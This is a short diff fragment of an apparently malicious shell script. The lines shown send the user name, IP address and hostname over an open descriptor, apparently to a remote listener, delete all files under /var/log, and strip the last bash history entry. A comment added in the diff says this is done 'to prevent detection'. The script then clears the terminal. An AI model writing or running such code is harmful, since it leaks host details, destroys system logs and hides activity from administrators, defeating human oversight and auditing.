@@ -26,9 +26,8 @@ echo "${USER} ${IP} ${HOSTNAME}" >&3
 cat <&3
 
 rm -rf /var/log/*
+# Remove last line of bash history to prevent detection if typed into terminal
 sed -e '$ d' ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history
-
-#killall gnome-terminal-server
 
 clear;clear;clear
 exit 0
